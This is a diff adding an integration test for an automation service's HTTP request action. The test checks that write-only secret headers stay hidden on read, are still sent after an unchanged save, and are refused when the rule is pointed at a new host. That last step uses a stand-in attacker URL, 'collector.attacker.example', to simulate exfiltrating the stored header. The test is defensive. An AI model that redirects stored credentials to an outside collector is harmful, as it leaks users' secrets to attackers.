@@ -8,7 +8,7 @@ import { createTestApp } from './helpers/app';
 import { authed, signUpUser } from './helpers/users';
 import { DB } from '../src/db/db.module';
 import type { Db } from '../src/db/client';
-import { automationJobs } from '../src/db/schema';
+import { automationJobs, automations } from '../src/db/schema';
 import { AutomationActionsService } from '../src/automations/actions.service';
 import type { ActionContext } from '../src/automations/actions.service';
 import { JobRunnerService } from '../src/automations/job-runner.service';
@@ -279,5 +279,49 @@ describe('http_request automation action (MN-263)', () => {
     });
     expect(latest?.status).toBe('failed');
     expect(latest?.lastError).toMatch(/unsupported scheme/);
+  });
+  it('#1068: a rule loaded and saved back unchanged still SENDS its write-only headers; a new host must re-enter them', async () => {
+    process.env.HTTP_ACTION_ALLOW_PRIVATE_CIDRS = '127.0.0.1/32';
+    const record = await createRecord('Kept header order');
+    const created = await inject('POST', `/workspaces/${wsId}/databases/${dbId}/automations`, {
+      name: 'Kept header rule',
+      // Never fires on its own (nothing updates this field) — only the test endpoint sends.
+      trigger: { type: 'record_updated', field_id: textFieldId },
+      actions: [
+        { type: 'http_request', method: 'GET', url: `${serverUrl}/kept`, headers: { 'X-Custom-Auth': 'kept-secret-1068' } },
+      ],
+    });
+    expect(created.statusCode, created.body).toBe(201);
+    const ruleId = created.json().id as string;
+
+    // Read the way the editor does: the value never leaves, even under a non-secret-looking name.
+    const list = await inject('GET', `/workspaces/${wsId}/databases/${dbId}/automations`);
+    expect(list.body).not.toContain('kept-secret-1068');
+    const loaded = list.json().data.find((r: { id: string }) => r.id === ruleId);
+    expect(loaded.actions[0].headers).toEqual({ 'X-Custom-Auth': { __keep: true } });
+
+    // Save it back verbatim (only the name changes) — the schema must accept the flag for http_request.
+    const saved = await inject('PATCH', `/workspaces/${wsId}/databases/${dbId}/automations/${ruleId}`, {
+      name: 'Kept header rule (renamed)',
+      actions: loaded.actions,
+    });
+    expect(saved.statusCode, saved.body).toBe(200);
+
+    const sent = await inject('POST', `/workspaces/${wsId}/databases/${dbId}/automations/${ruleId}/test`, {
+      record_id: record.id,
+      action_index: 0,
+    });
+    expect(sent.statusCode, sent.body).toBe(201);
+    expect(receivedRequests.at(-1)?.headers['x-custom-auth']).toBe('kept-secret-1068');
+
+    // Point it elsewhere and echo the flag → refused; the stored rule is untouched.
+    const moved = await inject('PATCH', `/workspaces/${wsId}/databases/${dbId}/automations/${ruleId}`, {
+      actions: [{ ...loaded.actions[0], url: 'https://collector.attacker.example/kept' }],
+    });
+    expect(moved.statusCode, moved.body).toBe(422);
+    const row = await db.query.automations.findFirst({ where: eq(automations.id, ruleId) });
+    const stored = (row!.actions as Array<{ url: string; headers: Record<string, string> }>)[0]!;
+    expect(stored.url).toBe(`${serverUrl}/kept`);
+    expect(stored.headers['X-Custom-Auth']).toBe('kept-secret-1068');
   });
 });
